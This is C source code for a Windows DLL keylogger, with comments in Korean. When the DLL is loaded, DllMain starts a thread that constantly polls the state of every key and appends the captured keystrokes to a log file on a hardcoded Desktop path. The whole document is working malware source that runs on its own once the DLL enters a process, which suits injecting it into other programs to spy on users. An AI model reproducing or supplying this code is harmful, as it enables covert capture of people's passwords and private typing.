#include <windows.h>
#include <stdio.h>

#define LOG_FILE "C:\\Users\\namkg\\Desktop\\keylog_dll.txt"

// 키 상태 추적 배열 (중복 방지)
static BOOL keyPressed[256] = {FALSE};

void LogKey(int key) {
    FILE* logFile = fopen(LOG_FILE, "a");
    if (logFile == NULL) return;

    if ((key >= 'A' && key <= 'Z') || (key >= '0' && key <= '9')) {
        fprintf(logFile, "%c", key);
    }
    else if (key == VK_SPACE) fprintf(logFile, " ");
    else if (key == VK_RETURN) fprintf(logFile, "[ENTER]\n");
    else if (key == VK_BACK) fprintf(logFile, "[BACK]");
    else if (key == VK_TAB) fprintf(logFile, "[TAB]");
    else if (key == VK_SHIFT) fprintf(logFile, "[SHIFT]");
    else if (key == VK_CONTROL) fprintf(logFile, "[CTRL]");
    else if (key == VK_MENU) fprintf(logFile, "[ALT]");

    fclose(logFile);
}

DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
    FILE* logFile = fopen(LOG_FILE, "a");
    if (logFile) {
        fprintf(logFile, "\n=== Keylogger Started ===\n");
        fclose(logFile);
    }

    while (1) {
        for (int i = 8; i < 256; i++) {
            SHORT keyState = GetAsyncKeyState(i);
            
            // 키가 새로 눌렸을 때만 기록 (중복 방지!)
            if ((keyState & 0x8000) && !keyPressed[i]) {
                LogKey(i);
                keyPressed[i] = TRUE;
            }
            // 키가 떼어졌을 때 상태 초기화
            else if (!(keyState & 0x8000) && keyPressed[i]) {
                keyPressed[i] = FALSE;
            }
        }
        Sleep(10);  // CPU 부하 감소
    }
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
    }
    return TRUE;
}
